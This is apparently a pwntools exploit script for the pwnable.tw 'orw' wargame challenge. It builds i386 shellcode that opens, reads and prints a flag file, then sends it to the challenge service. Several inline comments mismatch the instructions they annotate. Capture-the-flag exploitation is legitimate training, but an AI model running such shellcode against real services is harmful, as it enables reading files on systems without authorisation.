#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("orw")
context.update(arch='i386',os='linux')
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10001)
    else:
        return process(elf.path)

io = start()

shellcode = asm('\n'.join([
    'push %d' % u32(b'ag\0\0'),
    'push %d' % u32(b'w/fl'),
    'push %d' % u32(b'e/or'),
    'push %d' % u32(b'/hom'),
    'mov edx, 0', # mode
    'mov ecx, 0', # Readonly
    'mov ebx, esp', # file path (on the top of stack)
    'mov eax, 5', # open
    'int 0x80',     # opening done

    'mov ebx, eax', # returned fd
    'mov eax, 3', # read syscall nr.
    'mov ecx, esp', # the current stack position as buffer
    'mov edx, 128',# 64 bytes - just a guess
    'int 0x80',     # call read

    'mov edx, eax', # eax now contains amount of bytes read
    'mov eax, 4', # write syscall number
    'mov ebx, 1', # use the saved fd
    'mov ecx, esp', # 1 = stdout
    'int 0x80'      # call write
]))

io.recvuntil(b"Give my your shellcode:")
io.send(shellcode)
io.interactive()
